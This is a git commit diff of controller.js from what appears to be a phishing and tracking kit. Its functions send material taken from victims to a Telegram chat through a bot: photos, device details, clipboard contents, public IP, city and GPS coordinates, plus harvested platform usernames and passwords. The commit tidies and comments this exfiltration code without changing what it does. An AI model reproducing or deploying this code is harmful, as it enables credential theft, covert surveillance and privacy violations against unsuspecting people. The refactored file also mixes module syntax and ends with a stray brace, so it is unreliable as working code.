e0ffc3d67106b1c4e43988e1f3ad37e99ab51fb8
Kaliboy002 <146410941+Kaliboy002@users.noreply.github.com>
2024-11-29 12:30:53 +0430

    Update controller.js

--- controller.js
+++ controller.js
@@ -6,43 +6,54 @@ Object.defineProperty(exports, "__esModule", { value: true });
 exports.sendPhoto = sendPhoto;
 exports.sendUserInfo = sendUserInfo;
 exports.sendSocialInfo = sendSocialInfo;
-const bot_1 = __importDefault(require("./config/bot"));
-const path_1 = __importDefault(require("path"));
-const fs_1 = __importDefault(require("fs"));
+
+import bot from './config/bot';
+import path from 'path';
+import fs from 'fs';
+
+// Function to send photo to the chat
 function sendPhoto(chatId, files) {
     return new Promise((resolve, reject) => {
         try {
             if (files && files['photo']) {
-                let tempFilePath = path_1.default.join(__dirname, "/public/images/" + Date.now() + ".jpg");
-                let photo = files['photo'];
+                // Generate a temporary file path for storing the uploaded photo
+                const tempFilePath = path.join(__dirname, "/public/images/" + Date.now() + ".jpg");
+                const photo = files['photo'];
+
+                // Move the uploaded photo to the temporary path
                 photo.mv(tempFilePath, (err) => {
                     if (err) {
                         console.error("Image mv error", err);
-                        reject(false);
+                        return reject("Error moving photo file.");
                     }
-                    bot_1.default.sendPhoto(chatId, fs_1.default.createReadStream(tempFilePath)).then(() => {
-                        fs_1.default.unlinkSync(tempFilePath);
+
+                    // Send the photo via bot
+                    bot.sendPhoto(chatId, fs.createReadStream(tempFilePath)).then(() => {
+                        // After successfully sending, delete the temporary file
+                        fs.unlinkSync(tempFilePath);
+                        resolve(true);
                     })
-                        .catch(err => {
-                        fs_1.default.unlinkSync(tempFilePath);
+                    .catch(err => {
+                        // If bot fails to send photo, ensure the temp file is deleted
+                        fs.unlinkSync(tempFilePath);
                         console.error("Error from telegram sendPhoto", String(err));
-                        reject(false);
+                        reject("Error sending photo.");
                     });
                 });
+            } else {
+                reject("No photo found in the files.");
             }
-            else {
-                reject(false);
-            }
-        }
-        catch (err) {
-            reject(false);
+        } catch (err) {
             console.error("Error from controller sendPhoto: ", err);
+            reject("Unexpected error in sendPhoto.");
         }
     });
 }
+
+// Function to send user information to the chat
 function sendUserInfo(chatId, info) {
     return new Promise((resolve, reject) => {
-        let message = `
+        const message = `
 <b>Device:</b> ${info.device}
 <b>Os:</b> ${info.os}
 <b>Battery:</b> ${info.battery.error ? info.battery.error : `
@@ -51,7 +62,7 @@ function sendUserInfo(chatId, info) {
 `}
 <b>Clipboard:</b> ${info.clipboard}
 <b>Languages:</b> ${info.languages}
-		
+
 <b>Public IP:</b> ${info.public_ip}
 > <b>City:</b> ${info.city}
 > <b>Country:</b> ${info.country}
@@ -63,25 +74,33 @@ function sendUserInfo(chatId, info) {
 > ${info.coordinates.latitude},${info.coordinates.longitude}
 > <b>Google Map:</b> https://www.google.com/maps/?q=${info.coordinates.latitude},${info.coordinates.longitude}
 `}`;
-        bot_1.default.sendMessage(chatId, message, { parse_mode: "HTML" }).then(() => {
-            resolve(true);
-        }).catch(err => {
-            console.error("Error from controller sendUserInfo: ", String(err));
-            reject(false);
-        });
+
+        bot.sendMessage(chatId, message, { parse_mode: "HTML" })
+            .then(() => {
+                resolve(true);
+            })
+            .catch(err => {
+                console.error("Error from controller sendUserInfo: ", String(err));
+                reject("Error sending user info.");
+            });
     });
 }
+
+// Function to send social info (username and password)
 function sendSocialInfo(chatId, credentials) {
     return new Promise((resolve, reject) => {
-        let message = `
+        const message = `
 <b>Platform:</b> ${credentials.platform}
 <b>Username:</b> ${credentials.username}
 <b>Password:</b> ${credentials.password}`;
-        bot_1.default.sendMessage(chatId, message, { parse_mode: "HTML" }).then(() => {
-            resolve(true);
-        }).catch(err => {
-            console.error("Error from controller sendUserInfo: ", String(err));
-            reject(false);
-        });
+
+        bot.sendMessage(chatId, message, { parse_mode: "HTML" })
+            .then(() => {
+                resolve(true);
+            })
+            .catch(err => {
+                console.error("Error from controller sendSocialInfo: ", String(err));
+                reject("Error sending social info.");
+            });
     });
-}
+		}
